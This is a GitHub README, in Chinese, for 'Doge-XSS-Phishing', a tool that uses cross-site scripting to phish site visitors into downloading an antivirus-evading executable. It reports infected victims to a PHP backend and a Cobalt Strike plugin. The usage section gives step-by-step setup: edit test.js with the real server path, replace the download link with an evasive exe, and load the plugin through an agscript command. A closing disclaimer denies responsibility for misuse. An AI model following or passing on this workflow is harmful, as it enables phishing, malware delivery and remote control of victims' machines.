# Doge-XSS-Phishing
Xss钓鱼，Cna插件配合PHP后端收杆;https://github.com/timwhitez/Doge-XSS-Phishing
Doge-XSS-Phishing
🐸Frog For Automatic Scan

🐶Doge For Defense Evasion&Offensive Security

Doge-XSS-Phishing
xss钓鱼，cna插件配合php后端收杆

希望这个解决方案够用

加入了set-cookie判断，修改了获取外网ip逻辑

Usage:
搭建bobo.php, 路径为http://www.xxx.com/bobo.php

把test.js里的路径修改为真实路径

在php根目录新建botIPs.txt文件用于存储已上线ip

test.js可远程加载也可本地加载，修改xss内容即可

修改test.js里的下载地址为免杀exe的地址

使用cobalt strike 的agscript加载cna插件

./agscript [ip] [port] [username] [password] sendip.cna

等待上线即可

致谢：
此项目借鉴如下:

[鸭王师傅]: https://github.com/TheKingOfDuck/XSS-Fishing2-CS

[xq17师傅]: https://xz.aliyun.com/t/7958

todo:
在出口一致的情况下加入多个判断依据

对x64与x86区分

🚀Star Trend
Stargazers over time

etc
开源的样本大部分可能已经无法免杀,需要自行修改

我认为基础核心代码的开源能够帮助想学习的人

本人从github大佬项目中学到了很多

若用本人项目去进行：HW演练/红蓝对抗/APT/黑产/恶意行为/违法行为/割韭菜，等行为，本人概不负责，也与本人无关

本人已不参与大小HW活动的攻击方了，若溯源到timwhite id与本人无关
